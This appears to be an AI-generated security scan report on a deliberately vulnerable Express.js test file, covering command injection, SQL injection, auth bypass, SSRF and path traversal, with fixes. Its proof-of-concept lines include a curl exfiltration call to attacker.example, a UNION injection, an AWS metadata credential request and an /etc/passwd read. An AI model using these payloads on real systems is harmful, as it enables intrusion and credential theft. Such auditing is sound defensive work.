# Glasswing scan report

**Target:** `/Users/markcarr/Desktop/Claude/Projects/glasswing-mini/samples`  
**Model:** `claude-sonnet-4-6`  
**Run:** 2026-04-23T12:45:50.169Z → 2026-04-23T12:46:42.839Z (8 steps, stopped: finished)

## Summary

Scanned a single-file Express.js application (`server.js`, 65 lines). The file is self-described as an intentionally vulnerable smoke-test sample. I examined every route for the five focus vulnerability classes (RCE, SSRF, SQLi, Path Traversal, Auth Bypass) by reading the full file and tracing each data flow from HTTP input sources (`req.query`, `req.headers`) to dangerous sinks. I found and recorded five confirmed, high-confidence vulnerabilities: (1) critical OS command injection — `req.query.host` interpolated into `child_process.exec()`; (2) high SSRF — `req.query.url` passed verbatim to `node-fetch`, enabling requests to AWS metadata and internal services; (3) high path traversal — `req.query.name` joined onto a base path with `path.join()`, allowing `../../` escapes to read arbitrary files; (4) critical SQL injection — `req.query.id` interpolated directly into a PostgreSQL query string; and (5) critical auth bypass — admin privilege determined solely by the client-controlled `x-role` HTTP header. One safe parameterized query (`/user-safe`) was correctly identified as clean and not flagged. No additional files existed in the scan root.

## Findings by severity

- **critical**: 3
- **high**: 2

## Detail

## 1. [CRITICAL] OS Command Injection via unsanitized `host` query parameter
- **Class:** CWE-78 RCE / OS Command Injection
- **Location:** `server.js:16`
- **Confidence:** high
### Description
The `/ping` route reads `req.query.host` directly and interpolates it into a shell command string passed to `exec()`. There is no validation, escaping, or allowlisting of the value. An attacker can inject arbitrary shell metacharacters to execute any command on the server as the Node.js process user.
### Data flow

req.query.host (server.js:15) → template literal `ping -c 1 ${host}` (server.js:16) → child_process.exec() shell sink (server.js:16)

### Proof of concept

```
GET /ping?host=127.0.0.1%3B+curl+https%3A%2F%2Fattacker.example%2F%24(whoami)
— the semicolon breaks out of the ping command and runs curl, exfiltrating the current user.
```

### Suggested fix

Use `child_process.execFile` (or `spawn`) with an explicit argument array instead of a shell string: `execFile('ping', ['-c', '1', host], callback)`. Additionally validate `host` against a strict allowlist of IP/hostname patterns before use.


---

## 2. [CRITICAL] SQL Injection via string interpolation in PostgreSQL query
- **Class:** CWE-89 SQLi
- **Location:** `server.js:43`
- **Confidence:** high
### Description
The `/user` route interpolates `req.query.id` directly into a SQL query string. No parameterization or escaping is applied. An attacker can inject arbitrary SQL to dump the entire database, bypass access controls, or (if the DB user has the privilege) execute server-side commands via `COPY TO` or similar.
### Data flow

req.query.id (server.js:42) → template literal `SELECT * FROM users WHERE id = ${id}` (server.js:43) → pool.query() PostgreSQL sink (server.js:43)

### Proof of concept

```
GET /user?id=1%20UNION%20SELECT%20table_name,null,null%20FROM%20information_schema.tables--
— returns the names of all tables in the database alongside user rows.
```

### Suggested fix

Use the parameterized form already shown in `/user-safe` on line 50: `pool.query("SELECT * FROM users WHERE id = $1", [id])`. Never concatenate or interpolate user input into query strings.


---

## 3. [CRITICAL] Authentication Bypass via client-controlled `x-role` HTTP header
- **Class:** CWE-306 Auth Bypass
- **Location:** `server.js:56`
- **Confidence:** high
### Description
The `/admin/delete` route grants admin access by checking whether the `x-role` request header equals the string `"admin"`. Because HTTP headers are fully attacker-controlled, any client can trivially send `x-role: admin` to bypass the authorization check and trigger the admin delete action. There is no server-side session, token validation, or signature verification of any kind.
### Data flow

req.headers["x-role"] (server.js:56) → string equality check (server.js:56) → privileged delete branch (server.js:58)

### Proof of concept

```
POST /admin/delete HTTP/1.1
Host: target.example
x-role: admin
Content-Type: application/json

{}
— server responds with 200 "deleted" without any real credential check.
```

### Suggested fix

Implement proper server-side authentication (e.g., signed JWT verification with `jsonwebtoken.verify()` using a secret only the server knows, or a session cookie backed by a session store). Never rely on a client-supplied header for authorization decisions. Remove the `x-role` check entirely and replace it with middleware that validates a cryptographically signed token.


---

## 4. [HIGH] Server-Side Request Forgery (SSRF) via arbitrary user-supplied URL
- **Class:** SSRF
- **Location:** `server.js:25`
- **Confidence:** high
### Description
The `/fetch-url` route accepts a `url` query parameter and passes it directly to `node-fetch` with no validation or blocklist. An attacker can direct the server to make requests to any internal network resource — including the AWS EC2 instance metadata service (169.254.169.254), other internal services, or arbitrary external hosts — and the full response body is returned to the caller.
### Data flow

req.query.url (server.js:24) → fetch(url) (server.js:25) → r.text() (server.js:26) → res.send() (server.js:27)

### Proof of concept

```
GET /fetch-url?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
— returns AWS IAM credentials from the instance metadata service.
```

### Suggested fix

Validate the URL against a strict allowlist of approved schemes and hosts before fetching. Reject private/link-local IP ranges (RFC 1918, 169.254.x.x, ::1, etc.) using a library such as `ssrf-req-filter`. Never return raw upstream responses to the client.


---

## 5. [HIGH] Path Traversal allowing arbitrary file read via `name` query parameter
- **Class:** CWE-22 Path Traversal
- **Location:** `server.js:34`
- **Confidence:** high
### Description
The `/doc` route joins the user-supplied `name` parameter directly onto `/var/docs` using `path.join()`. Because `path.join` does not prevent traversal sequences, a value like `../../../etc/passwd` resolves to `/etc/passwd`, giving an unauthenticated attacker read access to any file readable by the Node.js process.
### Data flow

req.query.name (server.js:32) → path.join("/var/docs", name) (server.js:33) → readFile(path) (server.js:34) → res.send() (server.js:35)

### Proof of concept

```
GET /doc?name=../../../etc/passwd
— path.join resolves to /etc/passwd and the contents are returned in the response.
```

### Suggested fix

After joining, verify the resolved path still starts with the intended base directory: `const resolved = path.resolve('/var/docs', name); if (!resolved.startsWith('/var/docs' + path.sep)) return res.status(400).send('invalid');`. Also reject names containing null bytes.

